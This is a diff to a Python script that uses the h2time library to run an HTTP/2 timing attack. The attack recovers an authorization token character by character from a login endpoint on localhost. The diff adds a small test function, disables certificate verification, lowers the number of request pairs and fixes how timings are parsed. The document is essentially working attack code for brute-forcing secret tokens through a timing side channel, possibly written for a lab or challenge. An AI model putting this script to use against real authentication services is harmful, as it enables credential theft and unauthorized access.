@@ -10,12 +10,21 @@ async def create_auth_request(token: str) -> H2Request:
     """Create an H2Request with the specified Authorization token."""
     return H2Request(
         method="GET",
-        url="http://localhost:8888/auth/machine/login",
+        url="https://localhost:8888/auth/machine/login",
         headers={
             "Authorization": f"Bearer {token}",
             "User-Agent": "h2time/0.1"
         }
     )
+    
+async def run_two_gets():
+    r1 = H2Request('GET', 'https://tom.vg/?1', {'user-agent': ua})
+    r2 = H2Request('GET', 'https://tom.vg/?2', {'user-agent': ua})
+    logger.info('Starting h2time with 2 GET requests')
+    async with H2Time(r1, r2, num_request_pairs=5) as h2t:
+        results = await h2t.run_attack()
+        print('\n'.join(map(lambda x: ','.join(map(str, x)), results)))
+    logger.info('h2time with 2 GET requests finished')
 
 async def perform_timing_attack(token_prefix: str, char_set: str = string.digits + string.ascii_uppercase) -> str:
     """Perform a timing attack to find the next character in the token."""
@@ -28,11 +37,11 @@ async def perform_timing_attack(token_prefix: str, char_set: str = string.digits
         r2 = await create_auth_request(test_token + "x")  # Control request with invalid next char
         
         logger.info(f"Testing character: {char}")
-        async with H2Time(r1, r2, num_request_pairs=1000, sequential=True) as h2t:
+        async with H2Time(r1, r2, num_request_pairs=100, sequential=True, verify_cert=False) as h2t:
             results = await h2t.run_attack()
             if results:
                 # Calculate average timing difference
-                avg_diff = sum(r[1] - r[0] for r in results) / len(results)
+                avg_diff = sum(float(r[1]) - float(r[0]) for r in results) / len(results)
                 if avg_diff > best_score:
                     best_score = avg_diff
                     best_char = char
